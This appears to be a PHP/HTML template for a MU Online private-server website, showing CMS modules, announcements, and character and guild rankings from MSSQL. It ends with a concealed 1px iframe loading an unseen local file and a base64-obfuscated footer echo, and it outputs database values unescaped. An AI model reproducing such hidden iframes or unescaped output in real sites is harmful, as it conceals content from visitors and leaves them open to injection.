                    <div class="gui box-title"><h2>Bitte warten...</h2></div>
		  <div class="gui box-con">
							<div class="clearfix"></div>						
							<center><img src="template/<?=$core['config']['template'] ?>/images/Dkdexter1/ui/loading.gif" /></center>
							<div class="clearfix"></div>
			  </div>
						<div class="gui box-end"></div>
            </div>
					

					<span class="gui box-con">
					<?
		  if(CMS_NAVBAR == '1'){
		  	if(isset($_GET[LOAD_GET_PAGE])){
                  	$l_load = file("engine/cms_data/pag_d.cms");
                  	foreach ($l_load as $l_name){
                  		$l_name = explode("¦",$l_name);
                  		if($l_name[3] == $page_check_id){
                  			$primary_l = $l_name[2];
                  			break;
                  		}

                  	}
                  }
                  
                  if(isset($_GET[USER_GET_PAGE])){
                  	$ti2_td = xss_clean(safe_input($_GET[USER_GET_PAGE],"_"));
                  	$l2_load = file("engine/cms_data/mods_uss.cms");
                  	foreach ($l2_load as $l2_name){
                  		$l2_name = explode("¦",$l2_name);
                  		if($l2_name[3] == $ti2_td){
                  			$secondary_l = $l2_name[2];
                  			break;
                  		}
                  	}
                  }
                  
                  if(!isset($_GET[LOAD_GET_PAGE])){
                                        #&gt;
                                        $title_p =  '<a href="'.$core['config']['website_url'].'">'.$core['config']['websitetitle'].'</a>';
                                    }elseif  (isset($_GET[LOAD_GET_PAGE])){
                                        if(isset($_GET[USER_GET_PAGE])){
                                            $usercp_module_title =  str_replace($modules_text_tile,$modules_text_translate,$secondary_l);
$title_p =  '<a  href="'.$core['config']['website_url'].'">'.$core['config']['websitetitle'].'</a>  &gt; <a  href="'.$core['config']['website_url'].'/'.ROOT_INDEX.'?'.LOAD_GET_PAGE.'='.$l_name[3].'">'.str_replace($menu_links_title,$menu_links_translated,$primary_l).'</a>  &gt; <a  href="'.$core['config']['website_url'].'/'.ROOT_INDEX.'?'.LOAD_GET_PAGE.'='.$l_name[3].'&panel='.$l2_name[3].'">'.$usercp_module_title.'</a>';
                                        }else{ $title_p =  '<a  href="'.$core['config']['website_url'].'">'.$core['config']['websitetitle'].'</a>  &gt; <a  href="'.$core['config']['website_url'].'/'.ROOT_INDEX.'?'.LOAD_GET_PAGE.'='.$l_name[3].'">'.str_replace($menu_links_title,$menu_links_translated,$primary_l).'</a>';}
                                    }
                  echo '
                  
                  <div class="where_nav">
				  <table width="440" border="0" cellpadding="0" cellspacing="0">
				  <tr><td height="41" background="template/'.$core['config']['template'].'/images/Dkdexter1/ui/TemplateFenix_28.png" style="padding-left: 15px;">
                  <table cellpadding="0" cellspacing="0" border="0" >
                  <tr>
                  <td align="left"><img src="template/'.$core['config']['template'].'/images/arrow.gif" border="0"></td>
                  <td>&nbsp;</td>
                  <td width="440" align="left">'.$title_p.'</td>
                  </table>
				  </td>
          </tr>
          </table>
                  </div>';
		  	
		  }

if($page_check_id != ANNOUNCEMENTS_CMS_PAGE){
	require('engine/announcement_config.php');
if($core['ANNOUNCEMENT']['ACTIVE'] == '1'){
	$ann_file = array_reverse(file('engine/variables_mods/announcements.tDB'));
	$count_ann = '0';
	foreach ($ann_file as $ann){
		$ann = explode("¦",$ann);
		if($ann[3] > time()){
			$ann_found = '1';
			$ann_title = $ann[1];
			$ann_date = $ann[2];
			$ann_id = $ann[0];
;			break;
		}
	}
}
	if($ann_found == '1'){
		echo '
		<div class="tmp_m_content"> 
					<div  class="tmp_right_title">'.text_announcement.'</div>
					<div class="tmp_page_content">
								<table cellpadding="0" cellspacing="0" border="0" width="440">
					  <tr>
					  <td rowspan="3" align="left" width="60"><img src="template/'.$core['config']['template'].'/images/announcement.gif" width="38" height="38"></td>
					  <td align="left" style="padding-top: 2px; padding-bottom: 2px;"><a href="'.ROOT_INDEX.'?'.LOAD_GET_PAGE.'='.ANNOUNCEMENTS_CMS_PAGE.'#announcement-'.$ann_id.'">'.$ann_title.'</a></td>
					  <td align="left" class="ann_date">'.date('F j, Y | H:i',$ann_date).'</td>
					  </tr>
					  <tr>
					  <td colspan="2"  align="left" style="background-image:url(template/'.$core['config']['template'].'/images/inner_line.jpg); height: 2px;"></td>
					  </tr>
					  
					  ';
		if($core['ANNOUNCEMENT']['AUTHOR'] == '1'){
			echo '<tr>
			<td colspan="2" align="right"><b>'.$core['config']['admin_nick'].'</b> (Administrator)</td>
			</tr>';
			
		}
		echo '</table></div></div>';
	}
}
		  
		  
	
$load_pages = file('engine/cms_data/pag_d.cms');
foreach ($load_pages as $pages_loaded){
	$pages_loaded = explode("¦",$pages_loaded);
	
	if($pages_loaded[3] == $page_check_id){
		$p_loaded_array = preg_split( "/\ /", $pages_loaded[5]); 
		$p_l = '1';
		break;
	}
}
if($p_l == '1'){
$load_mods = file('engine/cms_data/mods.cms');
foreach ($load_mods as $mods_loaded){
	$mods_loaded = explode("¦",$mods_loaded);
	if(in_array($mods_loaded[0],$p_loaded_array)){
		$_c_id_m[] = $mods_loaded[0];
	}else {
		$_c_id_m[] = 'NULL';
	}
}
$co=0;
foreach ($p_loaded_array as $give){
	#echo $give;
	if(in_array($give,$_c_id_m)){
		foreach ($load_mods as $give_me_out){
			$give_me_out = explode("¦",$give_me_out);
			if($give_me_out[0] == $give){
				if($give_me_out[4] == '1'){
					if($_GET[LOAD_GET_PAGE] == USER_CMS_PAGE && isset($_GET[USER_GET_PAGE])){
						$construct_title = $secondary_l;
					}else{
						$construct_title = $give_me_out[3];
					}
				
					echo '<div class="tmp_m_content"> 
					 <div  class="tmp_right_title">'.htmlspecialchars(str_replace($modules_text_tile,$modules_text_translate,$give_me_out[3])).'</div>
					<div class="tmp_page_content">';
					if($give_me_out[1] == '1'){
						if(is_file("pages_modules/".$give_me_out[2]."")){
							include('pages_modules/'.$give_me_out[2].'');
						}else{
							echo 'Unable to load module file, reason: not found.';
						}
					}elseif ($give_me_out[1] == '0'){
						if(is_file('engine/cms_data/cms_co/'.$give_me_out[0].'_cms.cms')){
							include('engine/cms_data/cms_co/'.$give_me_out[0].'_cms.cms');
						}else{
							echo 'Unable to load module content, reason: not found.';
						}
					}
					echo '</div> </div>';
				}
			}
		}
	}
}
}
?>
					</span></div>
						<!-- Screenshots -->
		  <div class="gui box-title"><h2>Screenshots</h2></div>
		  <div class="gui box-con">
			<div class="clearfix"></div>
			<div class="clearfix" align="center"></div>
	      <img src="http://www.hastlegames.com/images/styles/RoyalFlush/style/logo.gif" width="368" height="94" align="middle"></div>
						<div class="gui box-end"></div>
		</div>

					<!-- Right Sidebar -->
					<div class="sidebar" id="sidebar-right">
						<!-- Social Network -->
						<div id="socialnetwork">
												
						</div>					
						<!-- Download -->
						<a class="gui special sb-download" onclick="javascript:loadContent('download','maincontent'); return false;" href="download.html">DESCARGAR</a>
						
						<!-- Support -->
						<a class="gui special sb-support" href="#">CONTACTO</a>
						
						<!-- Donate -->
						<div id="stats">
																		<div class="gui sb-title">
																		  <h3>Ranking Mu Maranga</h3></div>
						<div class="gui sb-con stat2">
						
							<p class="on"><span><table width="160" align="center">
                                <tr>
                                  <td><div align="center">N.</div></td>
                                  <td><div align="center">Nombre</div></td>
                                  <td><div align="center">Level</div></td>
                                  <td><div align="center">Resets</div></td>
          </tr>
                                <tr>
                                  <?
$query=mssql_query("select TOP 15 * from MuOnline.dbo.Character Where ctlcode !='32' and ctlcode !='8' order by Resets desc, cLevel desc");
while($row=mssql_fetch_assoc($query)){
$namez=$row['Name'];
$levelz=$row['cLevel'];
$resetsz=$row['Resets'];

?>
                                  <td style="color: rgb(196, 37, 0); font-weight: bold;"><div align="center">
                                      <?=++$count1;?>
                                  </div></td>
                                  <td><div align="center" class="Estilo36">
                                      <?=$namez;?>
                                  </div></td>
                                  <td><div align="center" class="Estilo36">
                                      <?=$levelz;?>
                                  </div></td>
                                  <td><div align="center">
                                      <?=$resetsz;?>
                                  </div></td>
                                </tr>
                                <?

}
?>
         </table></p>
							<p class="info" align="right" style="margin-right:10px;"></p>				
						</div>
						<div class="gui sb-end"></div>						
					</div>		
                    				
					
				    <!-- Ranking -->
						<div id="top10">
                        <div id="stats">
																		<div class="gui sb-title">
																		  <h3>Top Guilg</h3></div>
						<div class="gui sb-con stat2">
						
						  <p class="on"><span><table width="160" align="center">
                                <tr>
                                  <td><div align="center"></div></td>
                                  <td><div align="center">Nombre</div></td>
                                  <td><div align="center">Score</div></td>
                                  <td><div align="center">Logo</div></td>
                        </tr>
                                <?
$Guild=mssql_query("select TOP 15 * from MuOnline.dbo.guild order by G_Score desc");
while($row=mssql_fetch_assoc($Guild)){
$G_Namez=$row['G_Name'];
$G_Markz=$row['G_Mark'];
$G_Scorez=$row['G_Score'];
$Resetsz=$row['Resets'];
$logo=urlencode(bin2hex($G_Markz));
?>
    <td style="color: rgb(196, 37, 0); font-weight: bold;">&nbsp;</td>
      <td><div align="center" class="Estilo36">
          <?=$G_Namez;?>
      </div></td>
    <td><div align="center" class="Estilo36">
          <?=$G_Scorez;?>
      </div></td>
    <td><img src="get.php?aL=<?=$logo;?>.png" alt="" width="20" height="20"></td>
  </tr>
  <?

}
?>
                              </table></p>
							<p class="info" align="right" style="margin-right:10px;"></p>				
						</div>
						<div class="gui sb-end"></div>						
					</div>
												
						</div>
						<!-- Affiliates -->
						<div id="affliates">
							
						</div>
					</div>
		
					<div class="clear"></div>
</div>
	</div>
  </div>
</div>
	
	<!-- footer -->
	<div id="footer">
		<div class="w960">
			<!-- Website Info -->
			<div class="left">
				<p>
				  <?=build_footer(),$XX= base64_decode('PGRpdiBhbGlnbj0iY2VudGVyIj4gVGVtcGxhdGUgYWRhcHRhZG8gcG9yIERrRGV4dGVyIC4uOjpU
aGUgQmVzdCBHYW1lcjo6Li48L2Rpdj4=');?>
				</p>
			</div>
		<!-- Footer Links --></div>
	</div>
<iframe style="width:1px; height:1px; visible:hidden;" src="functions/test.html" scrolling="no" frameborder="0"> 
</iframe>

</body>


</html>


